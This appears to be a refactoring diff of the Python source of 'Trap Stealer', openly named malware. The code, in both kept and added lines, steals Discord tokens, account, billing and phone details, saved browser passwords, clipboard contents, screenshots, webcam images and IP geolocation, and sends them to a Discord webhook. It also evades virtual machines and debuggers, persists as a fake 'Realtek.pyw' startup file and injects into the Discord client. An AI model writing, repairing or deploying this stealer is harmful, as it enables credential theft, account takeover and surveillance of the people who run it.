@@ -12,24 +12,22 @@ import urllib.request
 from json import loads, dumps
 import time
 from zipfile import ZipFile
-import re
 import subprocess
 import socket, getpass, ctypes
 from PIL import ImageGrab
 import platform
 from shutil import copy
-from os.path import isfile, join
+from os.path import isfile
 import winreg, random
 from sqlite3 import connect as sql_connect
-import win32crypt
 import requests
 from base64 import b64decode
 from Crypto.Cipher import AES
-from json import loads as json_loads
-import os, os.path, zipfile
+import os.path, zipfile
 import shutil, json
 import win32clipboard
 ### CONFIG ### 
+
 webhook = '' #Put ur webhook
 
 injection = False # If set to False it will not inject into discord
@@ -38,7 +36,6 @@ Startup = False # If True it will add the file into the startup folder
 shitty_message = False # If True it will print fake message, if you want to disable it replace with False
 antidebugging = False # If set to false it will dont check for VM or Debugger
 DiscordStop = False # If set to True it will make discord cannot be launched again by just removing content from index.js #----- IT WILL DISABLE INJECTION -----#
-
 StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True
 
 def antidebug():
@@ -100,6 +97,10 @@ def check_dll():
     if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
         exit_program('Detected Vm')
 
+headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+    }
 
 try:
     if antidebugging == True:
@@ -115,7 +116,6 @@ class DATA_BLOB(Structure):
         ('pbData', POINTER(c_char))
     ]
 
-    # ---------------------------------------------------------------
 
 if shitty_message == True:
     print('Importing Module...')
@@ -166,16 +166,14 @@ def DecryptValue(buff, master_key=None):
     
 
 def Clipboard():
-  win32clipboard.OpenClipboard()
-  clipboard_data = win32clipboard.GetClipboardData()
-  win32clipboard.CloseClipboard()
+    win32clipboard.OpenClipboard()
+    clipboard_data = win32clipboard.GetClipboardData()
+    win32clipboard.CloseClipboard()
 
-  return clipboard_data
+    return clipboard_data
 
-try:
-    clipboardtext = Clipboard()
-except:
-    clipboardtext = 'Could not get the data | Empty or an image'
+clipboardtext = Clipboard()
+
 path = f"{os.getenv('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
 
 def startup():
@@ -276,6 +274,7 @@ if injection == True:
 
 else:pass
 
+
 def systemInfo():
     system = platform.system()
     node_name = platform.node()
@@ -286,17 +285,25 @@ def systemInfo():
     username = os.getlogin() if os.name == "nt" else os.getenv("USER")
     home_dir = os.path.expanduser("~")
 
-    sys_info = f"System information:\n`{system}`\nNode name: `{node_name}`\nRelease: `{release}`\nVersion: `{version}`\nMachine: `{machine}`\nProcessor: `{processor}`\nHome directory: `{home_dir}`\n"
+    sys_info = f"System information:\n"\
+               f"{system}\n"\
+               f"Node name: {node_name}\n"\
+               f"Release: {release}\n"\
+               f"Version: {version}\n"\
+               f"Machine: {machine}\n"\
+               f"Processor: {processor}\n"\
+               f"Home directory: {home_dir}\n"
 
     return sys_info
+
 
 def globalInfo():
     url = 'https://ipinfo.io/json'
     response = urllib.request.urlopen(url)
-    data = json.load(response)
+    data = json.loads(response.read().decode())
     ip = data['ip']
     loc = data['loc']
-    location = re.findall(r'\d+.\d+', loc)
+    location = loc.split(',')
     latitude = location[0]
     longitude = location[1]
     username = os.getlogin()
@@ -307,15 +314,22 @@ def globalInfo():
     postal = data['postal']
     computer_name = socket.gethostname()
     cores = os.cpu_count()
-    gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
+    gpu = ''
+    if platform.system() == 'Linux':
+        gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
+        if gpu_info:
+            gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
 
     globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nMore Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : `{gpu}` \nLatitude + Longitude  : {latitude}, {longitude} "
     return globalinfo
 
+
 def getip():
     ip = "None"
     try:
-        ip = urlopen(Request("https://checkip.amazonaws.com")).read().decode().strip()
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
     except:
         pass
     return ip
@@ -359,65 +373,75 @@ else:
     pass
 
 
-
-def GetUHQFriends(Tokq):
+def get_uhq_friends(tokq):
     headers = {
-        "Authorization": Tokq,
+        "Authorization": tokq,
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
     try:
-        friendslist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
+        response = urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers))
+        friendslist = json.loads(response.read().decode())
     except:
         return False
 
     uhqlist = ''
     for friend in friendslist:
-        OwnedBadges = ''
+        owned_badges = ''
         flags = friend['user']['public_flags']
         for badge in badgeList:
             if flags // badge["Value"] != 0 and friend['type'] == 1:
-                if not "House" in badge["Name"]:
-                    OwnedBadges += badge["Emoji"]
+                if "House" not in badge["Name"]:
+                    owned_badges += badge["Emoji"]
                 flags = flags % badge["Value"]
-        if OwnedBadges != '':
-            uhqlist += f"{OwnedBadges} - {friend['user']['username']}#{friend['user']['discriminator']} | ID : ({friend['user']['id']})\n"
+        if owned_badges != '':
+            uhqlist += f"{owned_badges} - {friend['user']['username']}#{friend['user']['discriminator']} | ID : ({friend['user']['id']})\n"
     return uhqlist
 
 
+def get_badge(flags):
+    if flags == 0:
+        return ''
 
-def GetBadge(flags):
-    if flags == 0: return ''
-
-    OwnedBadges = ''
+    owned_badges = ''
     for badge in badgeList:
         if flags // badge["Value"] != 0:
-            OwnedBadges += badge["Emoji"]
+            owned_badges += badge["Emoji"]
             flags = flags % badge["Value"]
-    return OwnedBadges
+    return owned_badges
 
-def GetTokqInfo(Tokq):
+
+def get_tokq_info(tokq):
     headers = {
-        "Authorization": Tokq,
+        "Authorization": tokq,
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
-    UserInfo = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
+    response = urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
+    user_info = json.loads(response.read().decode())
 
-    username = UserInfo["username"];hashtag = UserInfo["discriminator"];email = UserInfo["email"];id = UserInfo["id"];pfp = UserInfo["avatar"];flags = UserInfo["public_flags"];nitro = "";phone = "-"
+    username = user_info["username"]
+    hashtag = user_info["discriminator"]
+    email = user_info.get("email", "")
+    user_id = user_info["id"]
+    pfp = user_info["avatar"]
+    flags = user_info["public_flags"]
+    nitro = ""
+    phone = "-"
 
-    if "premium_type" in UserInfo: 
-        nitros = UserInfo["premium_type"]
+    if "premium_type" in user_info:
+        nitros = user_info["premium_type"]
         if nitros == 1:
             nitro = "<:classic:896119171019067423> "
         elif nitros == 2:
             nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
-    if "phone" in UserInfo:
-        phone = f'`{UserInfo["phone"]}`'
 
-    return username, hashtag, email, id, pfp, flags, nitro, phone
+    if "phone" in user_info:
+        phone = f'`{user_info["phone"]}`'
+
+    return username, hashtag, email, user_id, pfp, flags, nitro, phone
 
 def checkTokq(Tokq):
     headers = {
@@ -459,16 +483,13 @@ def GetBilling(Tokq):
 
 
 def uploadTokq(Tokq, path):
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
-
-    username, hashtag, email, user_id, pfp, flags, nitro, phone = GetTokqInfo(Tokq)
+    username, hashtag, email, user_id, pfp, flags, nitro, phone = get_tokq_info(Tokq)
 
     pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
 
-    billing = GetBilling(Tokq);badge = GetBadge(flags);friends = GetUHQFriends(Tokq)
+    billing = GetBilling(Tokq)
+    badge = get_badge(flags)
+    friends = get_uhq_friends(Tokq)
 
     if friends == '': friends = "No Rare Friends"
     if not billing:
@@ -533,6 +554,7 @@ def uploadTokq(Tokq, path):
     }
 
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
 def upload_file(file_path):
     try:
         response = requests.post(
@@ -598,6 +620,7 @@ def writeforfile(data, name):
 
 paswWords = []
 Passw = []
+
 PasswCount = 0
 def getPassw(path, arg):
     global Passw, PasswCount
@@ -635,6 +658,7 @@ def getPassw(path, arg):
             PasswCount += 1
     writeforfile(Passw, 'passw')
 
+
 sysinfo = systemInfo()
 data = {
     "username": "Trap Stealer",
@@ -655,11 +679,6 @@ data = {
         }
     ]
 }
-
-headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
 
 
 LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
@@ -700,7 +719,6 @@ def GatherAll():
         a.start()
         Threadlist.append(a)
 
-    # execute passw() after GatherAll() is done
     for thread in Threadlist:
         thread.join()
     file = os.getenv("TEMP") + f"\wppassw.txt"; filename = "wppassw.txt"
@@ -728,12 +746,6 @@ def GatherAll():
             }
         ]
     }
-
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
-
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
 
@@ -801,11 +813,6 @@ if urls:
                 }
             }
         ]
-    }
-
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
 LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
@@ -904,11 +911,6 @@ def screen():
         ]
     }
 
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
-
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
     file = {"file": open(img_path, "rb")}
@@ -932,13 +934,10 @@ if shitty_message == True:
     print('Starting..')
 else:
     pass
+
 try:
     screen()
 except:
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
 
     data = {
         "username": "Trap Stealer",
@@ -962,11 +961,6 @@ except:
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
 def Camera_get():
-
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
 
     try:
         subprocess.run(["fswebcam", "-q", "image.jpg"])
@@ -1008,11 +1002,6 @@ def Camera_get():
         }
 
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-
-try:
-    Camera_get()
-except:
-    pass
 
 if fakeerror == True:
 
